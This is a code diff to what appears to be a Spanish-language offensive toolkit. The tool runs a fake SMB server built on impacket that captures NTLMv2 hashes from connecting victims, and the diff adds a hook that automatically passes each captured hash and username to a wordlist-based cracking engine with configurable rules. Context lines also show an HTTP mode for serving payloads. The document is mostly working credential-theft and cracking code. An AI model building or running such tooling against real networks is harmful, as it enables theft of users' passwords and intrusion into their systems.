@@ -31,9 +31,13 @@ from core.output import console
 class NTLMHashCapture:
     """Callback de impacket que registra hashes NTLMv2 capturados."""
 
-    def __init__(self, output_file=None):
-        self.hashes      = []
-        self.output_file = output_file
+    def __init__(self, output_file=None, wordlist=None,
+                 crack_engine='auto', crack_rules=None):
+        self.hashes       = []
+        self.output_file  = output_file
+        self.wordlist     = wordlist
+        self.crack_engine = crack_engine
+        self.crack_rules  = crack_rules
 
     def do_header(self, connData):
         pass
@@ -70,13 +74,26 @@ class NTLMHashCapture:
                     f.write(ntlmv2_hash + "\n")
                 console.print(f"  [dim]Guardado en: {self.output_file}[/dim]")
 
+            # Hook automático: intentar crackear si hay wordlist
+            if self.wordlist:
+                from core.hooks import on_hash_capturado
+                on_hash_capturado(
+                    hash_str=ntlmv2_hash,
+                    formato='netntlmv2',
+                    wordlist=self.wordlist,
+                    engine=self.crack_engine,
+                    rules=self.crack_rules,
+                    usuario=username,
+                )
+
         except Exception as e:
             console.print(f"  [yellow]! Error parseando hash: {e}[/yellow]")
 
         return True   # Rechazar autenticación (no queremos dar acceso real)
 
 
-def run_smb_server(ip, port, output_file, share_name, share_path):
+def run_smb_server(ip, port, output_file, share_name, share_path,
+                   wordlist=None, crack_engine='auto', crack_rules=None):
     """Levanta un servidor SMB falso con impacket."""
     try:
         from impacket.smbserver import SimpleSMBServer
@@ -85,7 +102,10 @@ def run_smb_server(ip, port, output_file, share_name, share_path):
         return
 
     os.makedirs(share_path, exist_ok=True)
-    capture = NTLMHashCapture(output_file)
+    capture = NTLMHashCapture(output_file,
+                              wordlist=wordlist,
+                              crack_engine=crack_engine,
+                              crack_rules=crack_rules)
 
     console.print(f"  [bold cyan]SMB server[/bold cyan] escuchando en {ip}:{port}")
     console.print(f"  [dim]Share: \\\\<objetivo>\\{share_name} → {share_path}[/dim]")
@@ -186,6 +206,8 @@ def build_parser():
     p_smb.add_argument("--share",      default="share",    help="Nombre del share (default: share)")
     p_smb.add_argument("--dir",        default="/tmp/lobera-smb", help="Directorio a compartir")
     p_smb.add_argument("--output",     default=None,       help="Fichero donde guardar los hashes")
+    from core.hooks import add_args_on_hash_crack
+    add_args_on_hash_crack(p_smb)
 
     # ── http ─────────────────────────────────────────────────────────────────
     p_http = subs.add_parser("http", help="Servidor HTTP para servir payloads")
@@ -254,7 +276,10 @@ def main():
 
     if args.mode == "smb":
         run_smb_server(args.ip, args.port, args.output,
-                       args.share, args.dir)
+                       args.share, args.dir,
+                       wordlist=getattr(args, 'on_hash_crack', None),
+                       crack_engine=getattr(args, 'crack_engine', 'auto'),
+                       crack_rules=getattr(args, 'crack_rules', None))
 
     elif args.mode == "http":
         run_http_server(args.ip, args.port, args.dir)
